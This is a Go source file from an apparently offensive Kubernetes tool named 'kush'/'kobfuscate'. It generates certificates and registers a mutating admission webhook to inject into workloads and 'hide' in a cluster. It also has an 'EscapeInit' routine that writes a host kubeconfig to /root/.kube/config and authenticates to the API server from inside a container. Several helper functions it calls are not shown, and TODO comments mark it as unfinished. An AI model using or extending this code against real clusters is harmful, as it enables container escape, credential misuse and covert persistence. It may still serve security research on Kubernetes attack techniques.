/*===========================================================================*\
 *           MIT License Copyright (c) 2022 Kris Nóva <kris@nivenly.com>     *
 *                                                                           *
 *                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                *
 *                ┃   ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗   ┃                *
 *                ┃   ████╗  ██║██╔═████╗██║   ██║██╔══██╗  ┃                *
 *                ┃   ██╔██╗ ██║██║██╔██║██║   ██║███████║  ┃                *
 *                ┃   ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║  ┃                *
 *                ┃   ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║  ┃                *
 *                ┃   ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝  ┃                *
 *                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                *
 *                                                                           *
 *                       This machine kills fascists.                        *
 *                                                                           *
\*===========================================================================*/

package kobfuscate

import (
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"k8s.io/client-go/tools/clientcmd"

	admissionregistrationv1 "k8s.io/api/admissionregistration/v1"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/sirupsen/logrus"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type Runtime struct {
	namespace string
	client    *kubernetes.Clientset
}

const (
	DefaultServiceAccount string = "default"
	NamespaceLocation     string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
	HostKubeconfig        string = "/root/.kube/config"
)

var (
	RuntimeTimeout time.Duration = time.Second * 3
)

func NewRuntime() *Runtime {
	return &Runtime{}
}

// Todo we will need a "Generic" way to hide things in Kube
// Todo What will our "hide" input look like? maybe labels?

const (
	KushService = "kush"
	KushTLSOrg  = "nivenly.com"
)

var (
	InjectionPath = "/inject"
)

func (r *Runtime) Hide() error {

	// Create Cert Material

	dnsNames := []string{
		KushService,
		KushService + "." + r.Namespace(),
		KushService + "." + r.Namespace() + ".svc",
	}
	commonName := KushService + "." + r.Namespace() + ".svc"
	org := KushTLSOrg

	caPEM, certPEM, certKeyPEM, err := generateCert([]string{org}, dnsNames, commonName)
	if err != nil {
		return fmt.Errorf("failed to generate ca and certificate key pair: %v", err)
	}

	pair, err := tls.X509KeyPair(certPEM.Bytes(), certKeyPEM.Bytes())
	if err != nil {
		return fmt.Errorf("failed to load certificate key pair: %v", err)
	}

	// Create a mutating webhook config
	m := &admissionregistrationv1.MutatingWebhookConfiguration{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "kushmutatingwebhookcfg",
			Namespace: r.Namespace(),
		},
		Webhooks: []admissionregistrationv1.MutatingWebhook{
			{
				Name: commonName,
				ClientConfig: admissionregistrationv1.WebhookClientConfig{
					URL: nil,
					Service: &admissionregistrationv1.ServiceReference{
						Namespace: r.Namespace(),
						Name:      KushService,
						Path:      &InjectionPath,
						//Port:      nil,
					},
					CABundle: caPEM.Bytes(), // Inject CA Pem for the API server here!
				},
				Rules:         nil,
				FailurePolicy: nil,
				MatchPolicy:   nil,
				NamespaceSelector: &metav1.LabelSelector{
					MatchLabels:      nil,
					MatchExpressions: nil,
				},
				ObjectSelector: &metav1.LabelSelector{
					MatchLabels:      nil,
					MatchExpressions: nil,
				},
				SideEffects:             nil,
				TimeoutSeconds:          nil,
				AdmissionReviewVersions: nil,
				ReinvocationPolicy:      nil,
			},
		},
	}

	_, err = r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Create(context.TODO(), m, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create mutating webhook configuration: %v", err)
	}

	server := &http.Server{
		Addr:      fmt.Sprintf("%s:%d", "", 80),
		TLSConfig: &tls.Config{Certificates: []tls.Certificate{pair}},
	}

	// Handle paths
	mux := &http.ServeMux{}
	mux.HandleFunc(InjectionPath, HandleInject)

	// Set the handler
	server.Handler = mux

	return server.ListenAndServeTLS("", "")
}

func (r *Runtime) EscapeInit() error {

	// Host config
	kubeconfig, err := HostKubeConfig()
	if err != nil {
		return fmt.Errorf("unable to find host kubeconfig: %v", err)
	}
	err = ioutil.WriteFile(HostKubeconfig, []byte(kubeconfig), 0755)
	if err != nil {
		return fmt.Errorf("unable to write /tmp kubeconfig: %v", err)
	}

	cfg, err := clientcmd.BuildConfigFromFlags("", HostKubeconfig)
	if err != nil {
		return fmt.Errorf("unable to build config: %v", err)
	}

	// Client
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Host   : %s", cfg.Host)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())
	logrus.Infof("Connected to Kubernetes!")

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	return nil
}

// InClusterInit will ensure the client and see if we are running inside a cluster
func (r *Runtime) InClusterInit() error {

	// In cluster
	cfg, err := rest.InClusterConfig()
	if err != nil {
		return err
	}

	// Client
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Host   : %s", cfg.Host)
	logrus.Infof("Client : %s", cfg)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())
	logrus.Infof("Connected to Kubernetes!")

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	return nil
}

func (r *Runtime) Client() *kubernetes.Clientset {
	return r.client
}

func (r *Runtime) Namespace() string {
	if r.namespace == "" {
		bytes, err := ioutil.ReadFile(NamespaceLocation)
		if err != nil {
			return "default"
		}
		r.namespace = string(bytes)
	}
	return r.namespace
}
